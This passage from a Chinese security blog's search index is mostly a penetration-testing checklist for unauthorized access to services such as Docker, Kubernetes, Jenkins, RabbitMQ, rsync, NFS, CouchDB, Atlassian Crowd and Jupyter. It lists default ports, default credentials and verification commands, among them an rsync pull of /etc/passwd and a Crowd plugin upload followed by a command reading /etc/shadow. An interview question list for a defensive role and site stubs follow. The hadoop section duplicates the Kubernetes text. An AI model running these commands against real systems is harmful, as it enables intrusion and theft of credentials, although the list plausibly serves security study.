<h3 id="7-docker-remote-api-未授权访问"><a href="#7-docker-remote-api-未授权访问" class="headerlink" title="7.docker remote api 未授权访问"></a>7.docker remote api 未授权访问</h3><blockquote>
<p>默认端口2375</p>
</blockquote>
<p>漏洞验证</p>
<p>直接使用浏览器访问：</p>
<p><a href="http://10.10.4.89:2375/">http://10.10.4.89:2375/</a></p>
<p><a href="http://10.10.4.89:2375/version">http://10.10.4.89:2375/version</a></p>
<p><a href="http://10.10.4.89:2375/info">http://10.10.4.89:2375/info</a></p>
<p>docker -H tcp:&#x2F;&#x2F;192.168.15.5:2375 version</p>
<p>docker -H tcp:&#x2F;&#x2F;10.10.4.89:2375 images</p>
<h3 id="8-kubernetes-api-server-未授权访问"><a href="#8-kubernetes-api-server-未授权访问" class="headerlink" title="8.kubernetes api server 未授权访问"></a>8.kubernetes api server 未授权访问</h3><blockquote>
<p>默认端口 8080，6443</p>
</blockquote>
<p>漏洞验证</p>
<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
<p>端口：8080  <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
<p>端口：8080： api dashboard： <a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
<p><a href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
<p><a href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
<p><a href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
<h3 id="9-hadoop未授权访问"><a href="#9-hadoop未授权访问" class="headerlink" title="9.hadoop未授权访问"></a>9.hadoop未授权访问</h3><blockquote>
<p>默认端口8088</p>
</blockquote>
<p>漏洞验证</p>
<p>端口：8080  <a href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
<p>端口：8080： api dashboard： <a href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
<p><a href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
<p><a href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
<p><a href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
<h3 id="10-jenkins未授权访问"><a href="#10-jenkins未授权访问" class="headerlink" title="10.jenkins未授权访问"></a>10.jenkins未授权访问</h3><blockquote>
<p>默认端口8080</p>
</blockquote>
<p>检测方法</p>
<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
<p>然后直接访问：<a href="http://192.168.18.129:8080/manage">http://192.168.18.129:8080/manage</a></p>
<h3 id="11-activeMQ未授权访问"><a href="#11-activeMQ未授权访问" class="headerlink" title="11.activeMQ未授权访问"></a>11.activeMQ未授权访问</h3><blockquote>
<p>默认端口8161</p>
</blockquote>
<p>漏洞验证</p>
<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
<p>ActiveMQ默认使用8161端口，默认用户名和密码是admin&#x2F;admin</p>
<h3 id="12-rabbitMQ未授权访问漏洞"><a href="#12-rabbitMQ未授权访问漏洞" class="headerlink" title="12.rabbitMQ未授权访问漏洞"></a>12.rabbitMQ未授权访问漏洞</h3><p>漏洞验证</p>
<p><a href="http://10.10.4.89:15672/">http://10.10.4.89:15672</a></p>
<p><a href="http://10.10.4.89:25672/">http://10.10.4.89:25672/</a></p>
<p><a href="http://10.10.4.89:15692/">http://10.10.4.89:15692/</a></p>
<p>默认账号密码都是guest</p>
<h3 id="13-sprintboot-actuator未授权访问"><a href="#13-sprintboot-actuator未授权访问" class="headerlink" title="13.sprintboot actuator未授权访问"></a>13.sprintboot actuator未授权访问</h3><p>漏洞特征，图标(绿叶子)和报错页面</p>
<p>漏洞验证</p>
<p>直接访问相关路径：</p>
<p><a href="http://10.2.20.48/autoconfig">http://10.2.20.48:/autoconfig</a></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.png" alt="1625021874(1)"></p>
<p>Spring Boot Actuator从未授权访问到getshell</p>
<p><a href="https://blog.csdn.net/qq_38154820/article/details/106330264">https://blog.csdn.net/qq_38154820/article/details/106330264</a></p>
<h3 id="14-FTP未授权访问漏洞（匿名登录）"><a href="#14-FTP未授权访问漏洞（匿名登录）" class="headerlink" title="14.FTP未授权访问漏洞（匿名登录）"></a>14.FTP未授权访问漏洞（匿名登录）</h3><p>漏洞验证</p>
<p>直接访问ftp路径：<a href="ftp://ip:port/">ftp://ip:port/</a></p>
<h3 id="15。jboss未授权访问"><a href="#15。jboss未授权访问" class="headerlink" title="15。jboss未授权访问"></a>15。jboss未授权访问</h3><p>漏洞特征：8080端口访问后左上角有jboss logo</p>
<p>漏洞验证</p>
<p>先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 <a href="http://ip:jboss端口/">http://ip:jboss端口/</a> 看是否能进入 jmx-console 和 web-console 。</p>
<h3 id="16-ldap未授权访问"><a href="#16-ldap未授权访问" class="headerlink" title="16.ldap未授权访问"></a>16.ldap未授权访问</h3><p>漏洞特征：phpldapadmin</p>
<p><a href="https://www.cnblogs.com/Zh1z3ven/p/13894171.html">https://www.cnblogs.com/Zh1z3ven/p/13894171.html</a></p>
<p>漏洞验证</p>
<p>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容。</p>
<h3 id="17-rsync未授权访问"><a href="#17-rsync未授权访问" class="headerlink" title="17.rsync未授权访问"></a>17.rsync未授权访问</h3><p>默认端口873</p>
<p>漏洞验证：</p>
<p>#rsync rsync:&#x2F;&#x2F;{target_ip}&#x2F;</p>
<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;</p>
<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src</p>
<p>利用rsync下载任意文件</p>
<p>rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p>
<h3 id="18：vnc未授权访问漏洞"><a href="#18：vnc未授权访问漏洞" class="headerlink" title="18：vnc未授权访问漏洞"></a>18：vnc未授权访问漏洞</h3><p>默认端口5900，5901</p>
<p>漏洞验证</p>
<p>vncviewer 192.168.15.8</p>
<h3 id="19-dubbo未授权访问"><a href="#19-dubbo未授权访问" class="headerlink" title="19.dubbo未授权访问"></a>19.dubbo未授权访问</h3><p>无明显特征</p>
<p>漏洞验证</p>
<p>telnet ip port</p>
<p>链接进入dubbo服务， 进行操作</p>
<h3 id="20-nfs共享目录未授权访问"><a href="#20-nfs共享目录未授权访问" class="headerlink" title="20.nfs共享目录未授权访问"></a>20.nfs共享目录未授权访问</h3><p>默认端口2049,20048</p>
<p>漏洞验证</p>
<p>apt install nfs-common 安装nfs客户端</p>
<p>showmount -e 192.168.70.162 查看nfs服务器上的共享目录</p>
<p>mount -t nfs 192.168.70.162:&#x2F;grdata &#x2F;mnt 挂载到本地</p>
<h3 id="21-druid未授权访问"><a href="#21-druid未授权访问" class="headerlink" title="21.druid未授权访问"></a>21.druid未授权访问</h3><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.jpg" alt="img"></p>
<p>漏洞描述</p>
<p>当开发者配置不当时就可能造成未授权访问下面给出常见Druid未授权访问路径</p>
<p>&#x2F;druid&#x2F;websession.html</p>
<p>&#x2F;system&#x2F;druid&#x2F;websession.html </p>
<p>&#x2F;webpage&#x2F;system&#x2F;druid&#x2F;websession.html(jeecg)</p>
<p>漏洞验证</p>
<p>访问相关的路径：<a href="http://10.20.37.152:7001/BSCC/druid/index.html">http://10.20.37.152:7001/BSCC/druid/index.html</a></p>
<h3 id="22-couchdb未授权访问漏洞"><a href="#22-couchdb未授权访问漏洞" class="headerlink" title="22.couchdb未授权访问漏洞"></a>22.couchdb未授权访问漏洞</h3><p>默认端口：5984</p>
<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务：</p>
<p>curl <a href="http://192.168.18.129:5984/">http://192.168.18.129:5984</a></p>
<p>curl <a href="http://192.168.18.129:5984/_config">http://192.168.18.129:5984/_config</a></p>
<h3 id="23-atlassian-crowd未授权访问"><a href="#23-atlassian-crowd未授权访问" class="headerlink" title="23.atlassian crowd未授权访问"></a>23.atlassian crowd未授权访问</h3><p>漏洞特征：左上角atlassian的logo端口，默认端口8095</p>
<p>漏洞验证</p>
<p>进行上传一个标准的插件，来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar</p>
<p>curl –form “file_cdl&#x3D;@applinks-plugin-5.4.12.jar” <a href="http://192.168.18.138:8095/crowd/admin/uploadplugin.action">http://192.168.18.138:8095/crowd/admin/uploadplugin.action</a> -v</p>
<p>访问地址并执行命令：<a href="http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow">http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow</a></p>
<h3 id="24-jupyternotebook未授权访问"><a href="#24-jupyternotebook未授权访问" class="headerlink" title="24.jupyternotebook未授权访问"></a>24.jupyternotebook未授权访问</h3><p>漏洞特征：左上角有logo，jupyter</p>
<p>漏洞验证</p>
<p>利用nmap 扫描端口，获取到服务，访问地址：<a href="http://192.168.18.129:8888/">http://192.168.18.129:8888</a></p>
<p>利用terminal命令执行：New &gt; Terminal 创建控制台</p>
<p>可以执行任意命令</p>
<h3 id="25-windows-ipc-共享未授权访问"><a href="#25-windows-ipc-共享未授权访问" class="headerlink" title="25,windows ipc 共享未授权访问"></a>25,windows ipc 共享未授权访问</h3><p>工具扫描，远程验证</p>
<h3 id="26-rtsp未授权访问"><a href="#26-rtsp未授权访问" class="headerlink" title="26.rtsp未授权访问"></a>26.rtsp未授权访问</h3>]]></content>
  </entry>
  <entry>
    <title>长亭蓝中面试</title>
    <url>/2023/06/28/%E9%95%BF%E4%BA%AD%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<p>自我介绍</p>
<p>SQL注入的类型,  报错注入函数三个，主流防御sql注入的方式</p>
<p>中间件漏洞讲一下，weblogic，log4j，shiro,fastjson特征   jndi的攻击复现过没有，具体的细节是什么<br>监控的时候怎么区分扫描器和真实攻击ip<br>护网的时候用过什么设备<br>内网了解吗，xxx工具用过没</p>
<p>告警出现dns隐匿隧道，dns隐匿隧道如何区分，是不是误报  ，dns隧道和常规的dns解析有什么区别<br>ps：金融的一些内网流量可以dns解析出去，但是ping不通</p>
<p>落地的wabshell怎么开展工作，排查工具有什么<br>怎么排查自启动项</p>
<p>文件上传绕waf<br>溯源怎么溯<br>cs反制rce  （CVE-2022-39197,CVE-2022-23317,CVE-2021-36798)<br>内网的重点系统是什么，比如说集权之类的，域控算一个，还有什么</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/manifest.json</url>
    <content><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","scope":"/","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>这是一个标签页</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>wangzhi的好朋友们</title>
    <url>/link/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
